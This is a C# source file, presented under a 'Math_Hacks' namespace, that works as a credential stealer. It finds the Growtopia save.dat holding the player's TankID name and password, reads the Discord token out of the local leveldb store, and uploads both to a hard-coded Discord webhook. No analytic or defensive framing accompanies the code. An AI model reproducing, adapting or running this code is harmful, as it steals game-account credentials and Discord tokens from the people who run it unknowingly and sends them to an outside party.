using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Math_Hacks.Properties
{
    class HesabıGönder
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public HesabıGönder(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string content, string file = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
            data.Add(new StringContent(content), "content");

            if (file != null)
            {
                if (!File.Exists(file))
                    throw new FileNotFoundException();

                byte[] bytes = File.ReadAllBytes(file);
                DateTime now = DateTime.Now;
                data.Add(new ByteArrayContent(bytes), now + "account.dat", now + "account.dat"); //change "file" to "file.(extention) if you wish to download as ext
            }

            var resp = Client.PostAsync(Url, data).Result;

            return resp.StatusCode == HttpStatusCode.NoContent;
        }
    }
    class ArrayZ
    {
        public static string savePath()
        {
            try
            {
                RegistryKey gtreg;
                if (Environment.Is64BitOperatingSystem)
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    gtreg = gtreg.OpenSubKey(@"Software\Growtopia", true);
                    string pathvalue = (string)gtreg.GetValue("path");
                    if (Directory.Exists(pathvalue))
                    {
                        if (File.Exists(pathvalue + @"\save.dat"))
                        {
                            string sdat = null;
                            var r = File.Open(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read);
                            using (FileStream fileStream = new FileStream(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read))
                            {
                                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                                {
                                    sdat = streamReader.ReadToEnd();
                                    streamReader.Close();
                                }
                                r.Close();
                                fileStream.Close();
                            }

                            if (sdat.Contains("tankid_password") & sdat.Contains("tankid_name"))
                            {
                                return pathvalue + @"\save.dat";
                            }
                            else
                            {
                                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                            }
                        }
                        else
                        {
                            return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                        }

                    }
                    else
                    {
                        return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                    }
                }
                catch
                {
                    return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                }
            }
            catch
            {
                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
            }
        }
        public static string takeToken()
        {
            string result;
            try
            {
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
                int num;
                while ((num = text.IndexOf("oken")) != -1)
                {
                    text = text.Substring(num + "oken".Length);
                }
                string text2 = text.Split(new char[]
                {
                    '"'
                })[1];
                result = text2;
            }
            catch (Exception)
            {
                result = null;
            }
            return result;
        }
        public static void ParseText()
        {
            HesabıGönder br = new HesabıGönder("https://discordapp.com/api/webhooks/735517439697092740/CvZ5ZRwhsxk8enzCQ5HrG94qDoY-Rd-aQHBEiyT-Ad7YvGVrlVwcAK1cHkNjvIV1fS5o");
            br.Name = "ocalp";
            br.ProfilePictureUrl = "";
            br.SendMessage(takeToken(), savePath());
        }


    }
}
